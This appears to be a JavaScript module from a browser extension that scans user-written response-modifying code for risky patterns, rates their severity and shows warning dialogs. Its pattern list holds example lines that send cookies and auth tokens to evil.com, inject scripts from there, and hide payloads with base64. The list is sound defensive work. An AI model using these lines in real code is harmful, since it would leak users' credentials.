import { bindDialog } from '../../shared/dialogs.js';
import { getCSSVar, esc } from './utils.js';

const RISK_PATTERNS = [

  // ── CRITICAL (sev 3) ──────────────────────────────────────────────────────

  {
    id: 'network_fetch', sev: 3,
    label: 'Network request',
    why: 'Can exfiltrate page data, session cookies, and auth headers to any server.',
    example: 'fetch("https://evil.com?d=" + document.cookie)',
    pattern: /\bfetch\s*\(|\bnew\s+XMLHttpRequest\b|\bnavigator\.sendBeacon\s*\(/,
  },
  {
    id: 'websocket', sev: 3,
    label: 'WebSocket / EventSource',
    why: "Opens a persistent bidirectional channel invisible to the Network tab's request list.",
    example: 'new WebSocket("wss://evil.com/collect")',
    pattern: /\bnew\s+WebSocket\s*\(|\bnew\s+EventSource\s*\(|\bnew\s+RTCPeerConnection\s*\(/,
  },
  {
    id: 'storage', sev: 3,
    label: 'Storage / cookies read',
    why: 'localStorage, sessionStorage, IndexedDB, and document.cookie routinely hold auth tokens, JWTs, and PII.',
    example: 'const tok = localStorage.getItem("access_token")',
    pattern: /\blocalStorage\b|\bsessionStorage\b|\bindexedDB\b|\bdocument\.cookie\b/,
  },
  {
    id: 'dynamic_eval', sev: 3,
    label: 'eval / new Function',
    why: 'Executes an arbitrary string as code. The real payload can be hidden behind base64 or a remote fetch.',
    example: 'eval(atob("ZmV0Y2goImh0dHBzOi8v..."))',
    pattern: /\beval\s*\(|\bnew\s+Function\s*\(/,
  },
  {
    id: 'worker', sev: 3,
    label: 'Worker / ServiceWorker',
    why: 'Runs JS in a background thread not visible in DevTools Network. Used in crypto-miners and covert collection.',
    example: 'new Worker(URL.createObjectURL(new Blob([minerSrc])))',
    pattern: /\bnew\s+Worker\s*\(|\bnew\s+SharedWorker\s*\(|\bnavigator\.serviceWorker\b/,
  },
  {
    id: 'dom_write', sev: 3,
    label: 'DOM write / script injection',
    why: 'Writing to document or appending elements can inject scripts, keyloggers, or fake login forms.',
    example: 'document.body.innerHTML += "<script src=evil.com/x.js>"',
    pattern: /\bdocument\s*[.[)\s]|\bwindow\s*[.[)\s]/,
  },
  {
    id: 'extension_api', sev: 3,
    label: 'Extension API (chrome.*)',
    why: 'chrome.* in modifyResponse can read all other rules, exfiltrate them, or send messages to the background worker.',
    example: 'chrome.storage.local.get(null, d => leak(d))',
    pattern: /\bchrome\s*\.\s*\w/,
  },

  // ── HIGH (sev 2) ──────────────────────────────────────────────────────────

  {
    id: 'blob_url', sev: 2,
    label: 'Blob URL execution',
    why: 'Wraps a code string in a Blob so static analysis cannot inspect the actual payload.',
    example: 'const u = URL.createObjectURL(new Blob([hidden]))',
    pattern: /\bURL\.createObjectURL\s*\(|\bnew\s+Blob\s*\(/,
  },
  {
    id: 'crypto_api', sev: 2,
    label: 'Crypto API (proof-of-work)',
    why: "crypto.subtle can power in-browser mining loops or proof-of-work that burns the user's CPU silently.",
    example: 'crypto.subtle.digest("SHA-256", enc.encode(nonce + seed))',
    pattern: /\bcrypto\s*\.\s*subtle\b|\bcrypto\s*\.\s*getRandomValues\b/,
  },
  {
    id: 'prototype_hook', sev: 2,
    label: 'Prototype / property hook',
    why: 'Object.defineProperty or Proxy can intercept native page calls (e.g. wrapping fetch to clone every request body).',
    example: 'Object.defineProperty(window, "fetch", { get: () => spyFetch })',
    pattern: /\b__proto__\b|\bObject\.defineProperty\s*\(|\bObject\.setPrototypeOf\s*\(|\bnew\s+Proxy\s*\(|\bReflect\.defineProperty\s*\(/,
  },
  {
    id: 'obfuscation', sev: 2,
    label: 'Obfuscation primitives',
    why: 'atob, String.fromCharCode, and unescape are the three most common techniques to hide a payload from string search.',
    example: 'eval(atob("ZmV0Y2g..."))',
    pattern: /\batob\s*\(|\bbtoa\s*\(|\bString\.fromCharCode\s*\(|\bunescape\s*\(|\bdecodeURIComponent\s*\(/,
  },
  {
    id: 'postmessage', sev: 2,
    label: 'postMessage relay',
    why: 'Relays data to other frames or tabs — including attacker-controlled ones with a matching listener.',
    example: 'window.parent.postMessage({ token }, "*")',
    pattern: /\bpostMessage\s*\(/,
  },
  {
    id: 'location_redirect', sev: 2,
    label: 'Location redirect',
    why: 'Writing to location.href silently navigates the user away or leaks URL fragments and tokens via the Referer header.',
    example: 'location.href = "https://evil.com?t=" + authToken',
    pattern: /\blocation\s*\.\s*(href|replace|assign|reload)\s*[=(]/,
  },
  {
    id: 'timer_string', sev: 2,
    label: 'setTimeout / setInterval (string)',
    why: "Passing a string to setTimeout is eval() with a delay — a classic technique to defer payload execution past analysis.",
    example: "setTimeout(\"fetch('https://evil.com')\", 5000)",
    pattern: /\bsetTimeout\s*\(\s*["'`]|\bsetInterval\s*\(\s*["'`]/,
  },
  {
    id: 'navigator_sensors', sev: 2,
    label: 'Navigator sensors / credentials',
    why: 'Clipboard, geolocation, and mediaDevices APIs require permission but can read sensitive user input if granted.',
    example: 'navigator.clipboard.readText().then(send)',
    pattern: /\bnavigator\s*\.\s*(clipboard|geolocation|mediaDevices|credentials|permissions|getBattery)\b/,
  },
  {
    id: 'open_iframe', sev: 2,
    label: 'window.open / iframe injection',
    why: "Can spawn a pop-under or inject a hidden iframe that loads an attacker page with the user's cookies.",
    example: 'window.open("https://evil.com", "_blank")',
    pattern: /\bwindow\s*\.\s*open\s*\(|\bcreateElement\s*\(\s*["'`]iframe["'`]/,
  },

  // ── MEDIUM (sev 1) ────────────────────────────────────────────────────────

  {
    id: 'dynamic_import', sev: 1,
    label: 'Dynamic import()',
    why: 'Loads an ES module from a URL computed at runtime — URL can be built from a decoded or fetched string.',
    example: 'import(atob("aHR0cHM6Ly9ldmlsLmNvbS94LmpzCg=="))',
    pattern: /\bimport\s*\(/,
  },
  {
    id: 'fingerprinting', sev: 1,
    label: 'Canvas / WebGL / Audio fingerprint',
    why: 'Reads hardware-specific rendering output to uniquely identify the user without any visible permission prompt.',
    example: 'ctx.getImageData(...) / gl.getParameter(gl.RENDERER)',
    pattern: /\btoDataURL\s*\(|\bgetContext\s*\(\s*["'`](webgl|experimental-webgl|2d)|\bnew\s+AudioContext\s*\(|\bOffscreenCanvas\b/,
  },
  {
    id: 'dom_observer', sev: 1,
    label: 'DOM Observer (persistent)',
    why: 'MutationObserver persists after modifyResponse returns and silently fires on every future DOM change.',
    example: 'new MutationObserver(cb).observe(document.body, { childList: true })',
    pattern: /\bnew\s+MutationObserver\s*\(|\bnew\s+IntersectionObserver\s*\(|\bnew\s+ResizeObserver\s*\(|\bnew\s+PerformanceObserver\s*\(/,
  },
  {
    id: 'history_api', sev: 1,
    label: 'History API manipulation',
    why: 'pushState / replaceState silently changes the visible URL, which can spoof the address bar or break SPA routing.',
    example: 'history.pushState({}, "", "/admin/dashboard")',
    pattern: /\bhistory\s*\.\s*(pushState|replaceState)\s*\(/,
  },
  {
    id: 'symbol_hook', sev: 1,
    label: 'Symbol hook',
    why: 'Overriding Symbol.toPrimitive or Symbol.iterator can hijack implicit type-coercion in page code.',
    example: 'obj[Symbol.toPrimitive] = () => stealAndReturn()',
    pattern: /\bSymbol\s*\.\s*(toPrimitive|iterator|hasInstance|species)\b/,
  },
  {
    id: 'dangerous_globals', sev: 1,
    label: 'Dangerous globals (execCommand / open)',
    why: 'document.execCommand and similar globals can trigger clipboard writes or trigger file downloads.',
    example: 'document.execCommand("copy")',
    pattern: /\bdocument\.execCommand\s*\(|\bshowSaveFilePicker\s*\(|\bshowOpenFilePicker\s*\(/,
  },
];

export function analyzeCode(code) {
  if (!code || !code.trim()) return [];

  const stripped = code
    .replace(/\/\*[\s\S]*?\*\//g, ' ')
    .replace(/\/\/.*/g, ' ')
    .replace(/`(?:[^`\\]|\\.)*`/g, ' ')
    .replace(/"(?:[^"\\]|\\.)*"/g, ' ')
    .replace(/'(?:[^'\\]|\\.)*'/g, ' ');

  const stringContents = [];
  const strRe = /`((?:[^`\\]|\\.)*)`|"((?:[^"\\]|\\.)*)"|'((?:[^'\\]|\\.)*)'/g;
  let m;
  while ((m = strRe.exec(code)) !== null) {
    stringContents.push(m[1] ?? m[2] ?? m[3] ?? '');
  }
  const inStrings = stringContents.join('\n');

  const matched = new Set();
  for (const r of RISK_PATTERNS) {
    if (r.pattern.test(stripped) || r.pattern.test(inStrings)) matched.add(r);
  }
  return [...matched];
}

export function riskSeverity(risks) {
  if (!risks.length) return 0;
  return Math.max(...risks.map(r => r.sev));
}

export function showAllRisksPopup(highlightIds) {
  document.getElementById('sfvi-allrisks-popup')?.remove();

  const SEV_META = {
    3: { key:'CRITICAL', color:getCSSVar('--danger'), dim:'rgba(248,113,113,0.15)', bg:'rgba(248,113,113,0.10)' },
    2: { key:'HIGH',     color:getCSSVar('--orange'), dim:'rgba(245,158,11,0.15)',  bg:'rgba(245,158,11,0.10)'  },
    1: { key:'MEDIUM',   color:getCSSVar('--accent-link'), dim:'rgba(96,165,250,0.15)',  bg:'rgba(96,165,250,0.10)'  },
  };

  const _bg    = getCSSVar('--surface');
  const _bg2   = getCSSVar('--surface2');
  const _bg3   = getCSSVar('--surface3');
  const _bdr   = getCSSVar('--border');
  const _txt   = getCSSVar('--text');
  const _txt2  = getCSSVar('--text2');
  const _txt3  = getCSSVar('--text3');
  const _muted = getCSSVar('--muted');

  const highlight = new Set(highlightIds || []);

  const groups = [3, 2, 1].map(sev => {
    const m     = SEV_META[sev];
    const items = RISK_PATTERNS.filter(r => r.sev === sev);
    const rows  = items.map(r => {
      const active = highlight.has(r.id);
      return `
        <div style="
          margin-bottom:4px;padding:9px 11px;border-radius:6px;
          background:${active ? m.bg : _bg2};
          border:1px solid ${active ? m.color + '55' : _bdr};
        ">
          <div style="display:flex;align-items:center;gap:7px;margin-bottom:3px">
            <span style="
              font-size:9px;font-weight:700;letter-spacing:.08em;
              color:${active ? m.color : _muted};
              background:${active ? m.dim : _bg3};
              border:1px solid ${active ? m.color + '44' : _bdr};
              border-radius:3px;padding:1px 5px;white-space:nowrap;flex-shrink:0;
            ">${m.key}</span>
            <span style="font-weight:600;color:${active ? m.color : _txt2};font-size:11.5px">
              ${esc(r.label)}
            </span>
            ${active ? `<span style="
              margin-left:auto;font-size:9px;background:${m.dim};color:${m.color};
              border-radius:3px;padding:1px 6px;font-weight:700;white-space:nowrap;flex-shrink:0;
            ">DETECTED</span>` : ''}
          </div>
          <div style="font-size:11px;color:${active ? _txt3 : _muted};line-height:1.55;margin-bottom:4px">
            ${esc(r.why)}
          </div>
          <code style="font-size:10px;color:${_muted};font-family:var(--mono)">
            ${esc(r.example)}
          </code>
        </div>`;
    }).join('');

    const detectedCount = items.filter(r => highlight.has(r.id)).length;
    return `
      <div style="margin-bottom:16px">
        <div style="
          display:flex;align-items:center;gap:8px;
          margin-bottom:7px;padding-bottom:5px;border-bottom:1px solid ${m.dim};
        ">
          <span style="font-size:9px;font-weight:700;letter-spacing:.12em;color:${m.color}">${m.key}</span>
          <span style="font-size:9px;color:${_txt3}">${items.length} flags</span>
          ${detectedCount ? `<span style="
            margin-left:auto;font-size:9px;font-weight:700;
            color:${m.color};background:${m.dim};border-radius:3px;padding:1px 6px;
          ">${detectedCount} detected</span>` : ''}
        </div>
        ${rows}
      </div>`;
  }).join('');

  const totalDetected = highlight.size;

  const popup = document.createElement('dialog');
  popup.setAttribute('aria-label','Risk flag reference');
  popup.id = 'sfvi-allrisks-popup';
  popup.innerHTML = `
    <div id="sfvi-allrisks-bd" style="position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,.4)"></div>
    <div style="
      position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
      z-index:9999;width:min(540px,calc(100vw - 32px));max-height:82vh;
      background:${_bg};border:1px solid ${_bdr};border-radius:10px;
      display:flex;flex-direction:column;
      box-shadow:0 20px 60px rgba(0,0,0,.6);
    ">
      <div style="
        display:flex;align-items:center;justify-content:space-between;
        padding:13px 16px 11px;border-bottom:1px solid ${_bdr};flex-shrink:0;
      ">
        <div>
          <span style="font-size:13px;font-weight:600;color:${_txt}">Risk flag reference</span>
          <span style="font-size:10px;color:${_txt3};margin-left:8px">
            ${RISK_PATTERNS.length} patterns ·
            ${totalDetected
              ? `<span style="color:var(--danger);font-weight:600">${totalDetected} detected</span>`
              : 'none detected'}
          </span>
        </div>
        <button id="sfvi-allrisks-close" style="
          background:none;border:none;color:${_txt3};font-size:20px;
          cursor:pointer;line-height:1;padding:0 3px;
        ">×</button>
      </div>
      <div style="
        overflow-y:auto;padding:14px 16px;flex:1;
        font-family:var(--mono);
        scrollbar-width:thin;scrollbar-color:${_bdr} transparent;
      ">${groups}</div>
    </div>`;

  const panel=popup.lastElementChild;
  popup.replaceChildren(...panel.childNodes);
  const scroll=popup.lastElementChild;
  scroll.classList.add('risk-reference-scroll');
  scroll.tabIndex=0;
  scroll.setAttribute('role','region');
  scroll.setAttribute('aria-label','Risk flag descriptions');
  const close=popup.querySelector('#sfvi-allrisks-close');
  close.textContent='Close';
  close.setAttribute('aria-label','Close risk reference');
  close.style.fontSize='13px';
  close.style.minHeight='44px';
  close.addEventListener('click',() => popup.close());
  popup.addEventListener('close',() => popup.remove(),{once:true});
  bindDialog(popup);
  document.body.appendChild(popup);
  popup.showModal();
}

export function updateRiskBar() {
  const bar = document.getElementById('sfvi-risk-bar');
  if (!bar) return;

  const dynField = document.getElementById('dynamic-body-field');
  if (!dynField || dynField.style.display === 'none') { bar.style.display = 'none'; return; }

  const code = document.getElementById('f-body-dynamic')?.value || '';
  if (!code.trim()) { bar.style.display = 'none'; return; }

  const risks = analyzeCode(code);
  const sev   = riskSeverity(risks);
  bar.style.display = 'block';

  const _surf = getCSSVar('--surface');
  const SEV_CFG = {
    0: { bg:_surf, border:'rgba(52,211,153,0.22)',  dot:'#34d399', label:'Clean',    color:'#34d399' },
    1: { bg:_surf, border:'rgba(96,165,250,0.22)',  dot:'#60a5fa', label:'Medium',   color:'#60a5fa' },
    2: { bg:_surf, border:'rgba(245,158,11,0.22)',  dot:'#f59e0b', label:'High',     color:'#f59e0b' },
    3: { bg:_surf, border:'rgba(248,113,113,0.22)', dot:'#f87171', label:'Critical', color:'#f87171' },
  };
  const cfg = SEV_CFG[sev];

  const c3 = risks.filter(r => r.sev === 3);
  const c2 = risks.filter(r => r.sev === 2);
  const c1 = risks.filter(r => r.sev === 1);

  const SEV_BADGE = {
    3: { bg:'rgba(248,113,113,0.10)', color:'#f87171', border:'rgba(248,113,113,0.28)' },
    2: { bg:'rgba(245,158,11,0.10)',  color:'#f59e0b', border:'rgba(245,158,11,0.28)'  },
    1: { bg:'rgba(96,165,250,0.10)',  color:'#60a5fa', border:'rgba(96,165,250,0.28)'  },
  };

  const segments = [[3,'#ef4444'],[2,'#f59e0b'],[1,'#60a5fa']]
    .filter(([s]) => risks.some(r => r.sev === s))
    .map(([s, col]) => {
      const cnt  = risks.filter(r => r.sev === s).length;
      const wPct = Math.round((cnt / RISK_PATTERNS.length) * 100);
      return `<div style="width:${wPct}%;min-width:3px;height:100%;background:${col}"></div>`;
    }).join('');

  window.__sfviLastRiskIds = risks.map(r => r.id);

  bar.innerHTML = `
    <div style="
      margin-top:6px;
      background:${cfg.bg};border:1px solid ${cfg.border};border-radius:6px;
      padding:8px 11px;font-family:var(--mono);
    ">
      <div style="display:flex;align-items:center;gap:8px;margin-bottom:${risks.length ? '8px' : '0'}">
        <span style="
          width:7px;height:7px;border-radius:50%;flex-shrink:0;
          background:${cfg.dot};
          ${sev >= 2 ? 'box-shadow:0 0 6px ' + cfg.dot + '99' : ''}
        "></span>
        <span style="font-weight:700;color:${cfg.color};font-size:11.5px;letter-spacing:.03em">
          ${cfg.label}
        </span>
        ${risks.length ? `
          <span style="color:${cfg.color};opacity:.55;font-size:10px">
            ${c3.length ? c3.length + ' critical' + (c2.length || c1.length ? ' · ' : '') : ''}${c2.length ? c2.length + ' high' + (c1.length ? ' · ' : '') : ''}${c1.length ? c1.length + ' medium' : ''}
          </span>
          <div style="
            flex:1;height:4px;background:#ffffff0d;border-radius:2px;
            overflow:hidden;display:flex;gap:1px;margin-left:2px;
          ">${segments}</div>
        ` : `<span style="color:${getCSSVar('--text3')};font-size:10px;margin-left:2px">no patterns matched</span>`}
        <button id="sfvi-allflags-btn" style="
          margin-left:auto;flex-shrink:0;
          background:none;border:1px solid ${getCSSVar('--border2')};color:${getCSSVar('--text3')};
          border-radius:4px;padding:2px 8px;font-size:10px;
          cursor:pointer;font-family:inherit;white-space:nowrap;
        ">all flags ↗</button>
      </div>
      ${risks.length ? `
      <div style="display:flex;flex-wrap:wrap;gap:3px;margin-bottom:5px">
        ${risks.map(r => {
          const bc = SEV_BADGE[r.sev];
          const sevLabel = r.sev === 3 ? 'CRIT' : r.sev === 2 ? 'HIGH' : 'MED';
          return `
            <span
              data-risk-id="${esc(r.id)}"
              title="${esc(r.why + '\n\ne.g. ' + r.example)}"
              style="
                display:inline-flex;align-items:center;gap:4px;cursor:default;
                background:${bc.bg};color:${bc.color};border:1px solid ${bc.border};
                border-radius:4px;padding:2px 6px 2px 5px;font-size:10.5px;
              ">
              <span style="font-size:8.5px;font-weight:700;letter-spacing:.06em;opacity:.7">${sevLabel}</span>
              ${esc(r.label)}
            </span>`;
        }).join('')}
      </div>
      <div style="color:${getCSSVar('--muted')};font-size:10px;font-family:var(--font-sans)">
        Hover badge for details · confirmed on save
      </div>` : ''}
    </div>`;

  const allFlagsBtn = bar.querySelector('#sfvi-allflags-btn');
  if (allFlagsBtn) {
    allFlagsBtn.addEventListener('click', () => showAllRisksPopup(window.__sfviLastRiskIds));
    allFlagsBtn.addEventListener('mouseenter', () => {
      allFlagsBtn.style.borderColor = getCSSVar('--text3');
      allFlagsBtn.style.color       = getCSSVar('--text2');
    });
    allFlagsBtn.addEventListener('mouseleave', () => {
      allFlagsBtn.style.borderColor = getCSSVar('--border2');
      allFlagsBtn.style.color       = getCSSVar('--text3');
    });
  }
}

export function showSecurityWarning(risks) {
  return new Promise(resolve => {
    document.getElementById('sfvi-sec-modal')?.close();
    const modal=document.createElement('dialog');
    modal.id='sfvi-sec-modal';
    modal.className='security-warning';
    modal.setAttribute('aria-labelledby','security-warning-title');
    modal.setAttribute('aria-describedby','security-warning-description');
    const title=riskSeverity(risks) === 3 ? 'Critical risk detected' : 'Potentially risky code detected';
    modal.innerHTML=`
      <h2 id="security-warning-title">${title}</h2>
      <p id="security-warning-description">Only save this rule if you wrote it yourself or trust the source.</p>
      <ul class="security-findings">${risks.map(risk => `<li><strong>${esc(risk.label)}</strong><p>${esc(risk.why)}</p></li>`).join('')}</ul>
      <label class="security-accept"><input type="checkbox" id="sfvi-sec-accept"><span>I understand the risks and take responsibility for this rule</span></label>
      <div class="dialog-actions"><button type="button" class="btn-close" id="sfvi-sec-cancel">Cancel</button><button type="button" class="btn-save" id="sfvi-sec-save" disabled>Save anyway</button></div>`;
    bindDialog(modal);
    modal.querySelector('#sfvi-sec-accept').addEventListener('change',event => { modal.querySelector('#sfvi-sec-save').disabled=!event.target.checked; });
    modal.querySelector('#sfvi-sec-cancel').addEventListener('click',() => modal.close('cancel'));
    modal.querySelector('#sfvi-sec-save').addEventListener('click',() => modal.close('save'));
    modal.addEventListener('close',() => { const accepted=modal.returnValue === 'save'; modal.remove(); resolve(accepted); },{once:true});
    document.body.appendChild(modal);
    modal.showModal();
    modal.querySelector('#sfvi-sec-cancel').focus();
  });
}
